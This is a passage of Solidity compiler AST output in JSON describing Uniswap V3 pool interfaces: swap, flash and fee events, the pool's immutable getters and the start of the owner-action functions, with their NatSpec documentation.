														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1476,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "2776:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1478,
												"src": "2768:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1475,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2768:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2612:177:5"
									},
									"src": "2602:188:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1479,
										"nodeType": "StructuredDocumentation",
										"src": "2796:600:5",
										"text": "@notice Emitted by the pool for any swaps between token0 and token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the output of the swap\n @param amount0 The delta of the token0 balance of the pool\n @param amount1 The delta of the token1 balance of the pool\n @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n @param liquidity The liquidity of the pool after the swap\n @param tick The log base 1.0001 of price of the pool after the swap"
									},
									"eventSelector": "c42079f94a6350d7e6235f29174924f928cc2ac818eb64fed8004e115fbcca67",
									"id": 1495,
									"name": "Swap",
									"nameLocation": "3407:4:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1494,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1481,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nameLocation": "3437:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3421:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1480,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3421:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1483,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "3469:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3453:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1482,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3453:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1485,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "3495:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3488:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1484,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3488:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1487,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "3519:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3512:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1486,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3512:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1489,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nameLocation": "3544:12:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3536:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1488,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "3536:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1491,
												"indexed": false,
												"mutability": "mutable",
												"name": "liquidity",
												"nameLocation": "3574:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3566:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1490,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3566:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1493,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nameLocation": "3599:4:5",
												"nodeType": "VariableDeclaration",
												"scope": 1495,
												"src": "3593:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1492,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3593:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3411:198:5"
									},
									"src": "3401:209:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1496,
										"nodeType": "StructuredDocumentation",
										"src": "3616:562:5",
										"text": "@notice Emitted by the pool for any flashes of token0/token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the tokens from flash\n @param amount0 The amount of token0 that was flashed\n @param amount1 The amount of token1 that was flashed\n @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee"
									},
									"eventSelector": "bdbdb71d7860376ba52b25a5028beea23581364a40522f6bcfb86bb1f2dca633",
									"id": 1510,
									"name": "Flash",
									"nameLocation": "4189:5:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1509,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1498,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nameLocation": "4220:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4204:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1497,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4204:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1500,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "4252:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4236:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1499,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4236:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1502,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "4279:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4271:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1501,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4271:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1504,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "4304:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4296:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1503,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4296:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1506,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid0",
												"nameLocation": "4329:5:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4321:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1505,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4321:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1508,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid1",
												"nameLocation": "4352:5:5",
												"nodeType": "VariableDeclaration",
												"scope": 1510,
												"src": "4344:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1507,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4344:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4194:169:5"
									},
									"src": "4183:181:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1511,
										"nodeType": "StructuredDocumentation",
										"src": "4370:451:5",
										"text": "@notice Emitted by the pool for increases to the number of observations that can be stored\n @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n just before a mint/swap/burn.\n @param observationCardinalityNextOld The previous value of the next observation cardinality\n @param observationCardinalityNextNew The updated value of the next observation cardinality"
									},
									"eventSelector": "ac49e518f90a358f652e4400164f05a5d8f7e35e7747279bc3a93dbf584e125a",
									"id": 1517,
									"name": "IncreaseObservationCardinalityNext",
									"nameLocation": "4832:34:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1516,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1513,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextOld",
												"nameLocation": "4883:29:5",
												"nodeType": "VariableDeclaration",
												"scope": 1517,
												"src": "4876:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1512,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4876:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1515,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextNew",
												"nameLocation": "4929:29:5",
												"nodeType": "VariableDeclaration",
												"scope": 1517,
												"src": "4922:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1514,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4922:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4866:98:5"
									},
									"src": "4826:139:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1518,
										"nodeType": "StructuredDocumentation",
										"src": "4971:370:5",
										"text": "@notice Emitted when the protocol fee is changed by the pool\n @param feeProtocol0Old The previous value of the token0 protocol fee\n @param feeProtocol1Old The previous value of the token1 protocol fee\n @param feeProtocol0New The updated value of the token0 protocol fee\n @param feeProtocol1New The updated value of the token1 protocol fee"
									},
									"eventSelector": "973d8d92bb299f4af6ce49b52a8adb85ae46b9f214c4c4fc06ac77401237b133",
									"id": 1528,
									"name": "SetFeeProtocol",
									"nameLocation": "5352:14:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1527,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1520,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0Old",
												"nameLocation": "5373:15:5",
												"nodeType": "VariableDeclaration",
												"scope": 1528,
												"src": "5367:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1519,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5367:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1522,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1Old",
												"nameLocation": "5396:15:5",
												"nodeType": "VariableDeclaration",
												"scope": 1528,
												"src": "5390:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1521,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5390:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1524,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0New",
												"nameLocation": "5419:15:5",
												"nodeType": "VariableDeclaration",
												"scope": 1528,
												"src": "5413:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1523,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5413:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1526,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1New",
												"nameLocation": "5442:15:5",
												"nodeType": "VariableDeclaration",
												"scope": 1528,
												"src": "5436:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1525,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5436:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5366:92:5"
									},
									"src": "5346:113:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1529,
										"nodeType": "StructuredDocumentation",
										"src": "5465:384:5",
										"text": "@notice Emitted when the collected protocol fees are withdrawn by the factory owner\n @param sender The address that collects the protocol fees\n @param recipient The address that receives the collected protocol fees\n @param amount0 The amount of token0 protocol fees that is withdrawn\n @param amount0 The amount of token1 protocol fees that is withdrawn"
									},
									"eventSelector": "596b573906218d3411850b26a6b437d6c4522fdb43d2d2386263f86d50b8b151",
									"id": 1539,
									"name": "CollectProtocol",
									"nameLocation": "5860:15:5",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1538,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1531,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nameLocation": "5892:6:5",
												"nodeType": "VariableDeclaration",
												"scope": 1539,
												"src": "5876:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1530,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5876:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1533,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "5916:9:5",
												"nodeType": "VariableDeclaration",
												"scope": 1539,
												"src": "5900:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1532,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5900:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1535,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "5935:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1539,
												"src": "5927:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1534,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5927:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1537,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "5952:7:5",
												"nodeType": "VariableDeclaration",
												"scope": 1539,
												"src": "5944:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1536,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5944:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5875:85:5"
									},
									"src": "5854:107:5"
								}
							],
							"scope": 1541,
							"src": "159:5804:5",
							"usedErrors": [],
							"usedEvents": [
								1431,
								1448,
								1463,
								1478,
								1495,
								1510,
								1517,
								1528,
								1539
							]
						}
					],
					"src": "45:5919:5"
				},
				"id": 5
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
					"exportedSymbols": {
						"IUniswapV3PoolImmutables": [
							1580
						]
					},
					"id": 1581,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1542,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:6"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolImmutables",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1543,
								"nodeType": "StructuredDocumentation",
								"src": "71:153:6",
								"text": "@title Pool state that never changes\n @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
							},
							"fullyImplemented": false,
							"id": 1580,
							"linearizedBaseContracts": [
								1580
							],
							"name": "IUniswapV3PoolImmutables",
							"nameLocation": "234:24:6",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 1544,
										"nodeType": "StructuredDocumentation",
										"src": "265:138:6",
										"text": "@notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n @return The contract address"
									},
									"functionSelector": "c45a0155",
									"id": 1549,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nameLocation": "417:7:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1545,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "424:2:6"
									},
									"returnParameters": {
										"id": 1548,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1547,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1549,
												"src": "450:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1546,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "450:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "449:9:6"
									},
									"scope": 1580,
									"src": "408:51:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1550,
										"nodeType": "StructuredDocumentation",
										"src": "465:113:6",
										"text": "@notice The first of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "0dfe1681",
									"id": 1555,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nameLocation": "592:6:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1551,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "598:2:6"
									},
									"returnParameters": {
										"id": 1554,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1553,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1555,
												"src": "624:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1552,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "624:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "623:9:6"
									},
									"scope": 1580,
									"src": "583:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1556,
										"nodeType": "StructuredDocumentation",
										"src": "639:114:6",
										"text": "@notice The second of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "d21220a7",
									"id": 1561,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nameLocation": "767:6:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1557,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "773:2:6"
									},
									"returnParameters": {
										"id": 1560,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1559,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1561,
												"src": "799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1558,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "799:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "798:9:6"
									},
									"scope": 1580,
									"src": "758:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1562,
										"nodeType": "StructuredDocumentation",
										"src": "814:84:6",
										"text": "@notice The pool's fee in hundredths of a bip, i.e. 1e-6\n @return The fee"
									},
									"functionSelector": "ddca3f43",
									"id": 1567,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "fee",
									"nameLocation": "912:3:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1563,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "915:2:6"
									},
									"returnParameters": {
										"id": 1566,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1565,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1567,
												"src": "941:6:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1564,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "941:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "940:8:6"
									},
									"scope": 1580,
									"src": "903:46:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1568,
										"nodeType": "StructuredDocumentation",
										"src": "955:358:6",
										"text": "@notice The pool tick spacing\n @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n This value is an int24 to avoid casting even though it is always positive.\n @return The tick spacing"
									},
									"functionSelector": "d0c93a7c",
									"id": 1573,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickSpacing",
									"nameLocation": "1327:11:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1569,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1338:2:6"
									},
									"returnParameters": {
										"id": 1572,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1571,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1573,
												"src": "1364:5:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1570,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1364:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1363:7:6"
									},
									"scope": 1580,
									"src": "1318:53:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1574,
										"nodeType": "StructuredDocumentation",
										"src": "1377:363:6",
										"text": "@notice The maximum amount of position liquidity that can use any tick in the range\n @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n @return The max amount of liquidity per tick"
									},
									"functionSelector": "70cf754a",
									"id": 1579,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "maxLiquidityPerTick",
									"nameLocation": "1754:19:6",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1575,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1773:2:6"
									},
									"returnParameters": {
										"id": 1578,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1577,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1579,
												"src": "1799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1576,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1799:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1798:9:6"
									},
									"scope": 1580,
									"src": "1745:63:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1581,
							"src": "224:1586:6",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:1766:6"
				},
				"id": 6
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolOwnerActions": [
							1606
						]
					},
					"id": 1607,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1582,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:7"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolOwnerActions",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1583,
								"nodeType": "StructuredDocumentation",
								"src": "71:116:7",
								"text": "@title Permissioned pool actions\n @notice Contains pool methods that may only be called by the factory owner"
							},
							"fullyImplemented": false,
							"id": 1606,
							"linearizedBaseContracts": [
								1606
							],
							"name": "IUniswapV3PoolOwnerActions",
							"nameLocation": "197:26:7",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 1584,
										"nodeType": "StructuredDocumentation",
										"src": "230:205:7",
										"text": "@notice Set the denominator of the protocol's % share of the fees\n @param feeProtocol0 new protocol fee for token0 of the pool\n @param feeProtocol1 new protocol fee for token1 of the pool"
									},
									"functionSelector": "8206a4d1",
									"id": 1591,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeProtocol",
									"nameLocation": "449:14:7",
